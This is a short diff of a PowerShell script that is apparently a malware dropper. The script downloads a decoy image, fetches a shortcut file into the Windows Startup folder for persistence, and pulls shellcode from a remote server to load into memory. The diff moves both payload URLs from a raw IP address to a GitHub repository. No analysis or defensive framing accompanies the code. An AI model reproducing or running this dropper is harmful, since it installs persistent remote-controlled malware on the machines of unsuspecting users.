@@ -97,13 +97,14 @@ ModAllPShells
 
 Start-Sleep 5
 
+
 #/// EXECUTE THE SECOND PART OF THE SCRIPT (LOCAL OPERATIONS) \\#
 # Download the image (decoy)
 $imageUrl = "https://img.freepik.com/free-photo/abstract-surface-textures-white-concrete-stone-wall_74190-8189.jpg"
 $imagePath = "$env:TEMP\blue-bird.jpg"
 Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
 
-$luri = "http://96.9.124.105:8081/secret-image.lnk"
+$luri = "https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/secret-image.lnk"
 $sf = [System.Environment]::GetFolderPath('Startup')
 $lnp = "$sf\secret-image.lnk"
 Invoke-WebRequest -Uri $luri -OutFile $lnp
@@ -116,7 +117,7 @@ if (Test-Path $imagePath) {
 }
 
 # Download and load shellcode directly into memory
-$shellcodeUrl = "http://96.9.124.105:8081/loader.bin"
+$shellcodeUrl = "https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/loader.bin"
 $shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -UseBasicParsing).Content
 
 # Allocate memory for the shellcode
